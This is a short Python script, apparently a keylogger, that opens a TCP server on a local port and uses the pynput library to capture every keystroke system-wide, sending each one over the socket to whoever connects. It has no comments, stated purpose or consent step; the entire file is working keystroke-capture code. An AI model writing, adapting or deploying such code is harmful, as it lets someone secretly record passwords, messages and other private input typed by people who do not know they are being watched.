import socket
from pynput.keyboard import Listener

HOST = '127.0.0.1'
PORT = 12345

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen()

print (f"Server is listening on {HOST}:{PORT}")

client_socket, client_address = server_socket.accept()
print(f"Client {client_address} connected")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            client_socket.send(key.char.encode('utf-8'))
        else:
            client_socket.send(str(key).encode('utf-8'))
    except AttributeError:
        pass

with Listener(on_press=on_press) as listener:
    listener.join()

client_socket.close()
server_socket.close()